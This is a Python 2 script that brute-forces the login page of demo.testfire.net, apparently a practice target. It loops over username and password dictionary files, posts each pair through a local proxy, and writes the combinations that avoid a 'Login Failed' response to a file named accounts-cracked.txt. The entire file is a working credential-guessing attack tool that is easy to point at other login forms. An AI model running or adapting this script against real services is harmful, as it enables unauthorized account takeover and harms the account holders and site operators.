# -*- coding: utf-8 -*-
import urllib2
import urllib
import httplib
import requests
import re

headers = {"Host": "demo.testfire.net",
           "Connection": "keep-alive",
           "Cache-Control": "max-age=0",
           "Origin": "http://demo.testfire.net",
           "Upgrade-Insecure-Requests": "1",
           "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
           "Content-Type": "application/x-www-form-urlencoded",
           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
           "Referer": "http://demo.testfire.net/bank/login.aspx",
           "Accept-Encoding": "gzip, deflate",
           "Accept-Language": "zh-CN,zh;q=0.8,en;q=0.6",
           "Cookie": "ASP.NET_SessionId=j2ac00552nqcaz455zccx3ms; amSessionId=112127775897; amUserInfo=UserName=YWRtaW4=&Password=YWRtaW4=; amUserId=1"}
def brute_force(user, password):

    conn = httplib.HTTPConnection("localhost","8080")  # 代理
    params = urllib.urlencode({'uid': user, 'passw': password,'btnSubmit':'Login'})
    conn.request("POST", "http://demo.testfire.net/bank/login.aspx", params, headers=headers)  # 后台路径
    responseText = conn.getresponse().read()
    TXT = re.search("Login Failed:",responseText)
    if TXT is None:
        print '---- find user:', user, ' with password:',password, '-----'+'\n'
        outFile.write(user + ':' + password + '\n')
    else:
        print '----- error user:', user.replace('\n',''), ' with password:',password.replace('\n','') , '-----'
    return


outFile = open('accounts-cracked.txt', 'w')

if __name__ == '__main__':
    with open('user.dic', 'r') as userline:
        y = userline.readlines()
        with open('pass.dic', 'r') as passline:
            b= passline.readlines()
            for u in y:
                for p in b:
                    brute_force(user=u.replace('\n',''),password=p.replace('\n',''))
outFile.close()
with open('accounts-cracked.txt','r') as text:
    list = text.readlines()
    sum=len(list)

if sum>0:
    print "找到",sum,"个账号密码"
else:
    print "All thread OK,maybe not "
